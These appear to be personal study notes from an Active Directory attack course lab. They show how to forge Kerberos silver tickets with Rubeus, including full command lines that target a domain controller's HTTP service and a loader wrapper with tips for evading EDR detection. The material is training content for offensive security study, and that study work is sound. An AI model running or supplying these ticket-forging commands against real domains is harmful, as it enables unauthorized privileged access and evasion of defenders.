need the AES key or NTLM hash of the target service account, then forge the service ticket (TGS) of the target service account
- machine account is the most common service account (i.e. MACHINE$)
	- machine account passwords are reset every 30 days by default

# Rubeus

`C:\AD\Tools\Rubeus.exe silver /service:<SPN> /rc4:<hash> /sid:S-1-... /ldap /user:Administrator /domain:<DOMAIN> /ptt`
- SPN could be something like "http/dcorp-dc.dollarcorp.moneycorp.local"
- other services include HOST, RPCSS, CIFS, etc
- acceptable to use rc4 for service accounts since machine accounts still use them often




# Learning Objective

## Try to get command execution on the domain controller by creating silver tickets for 

### HTTP

forge silver ticket
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<machine_hash> /sid:S-1-5-... /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`
- should say ticket successfully created
![[assets/Pasted image 20260204052059.png]]
- some aggressive EDR's don't like when you run `klist`, but you can also check in Rubeus
- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist`

since the target is only for the HTTP service, you won't be able to list the C drive (you need CIFS)

### WMI

didn't go over in video, but the process is exactly the same just with different SPN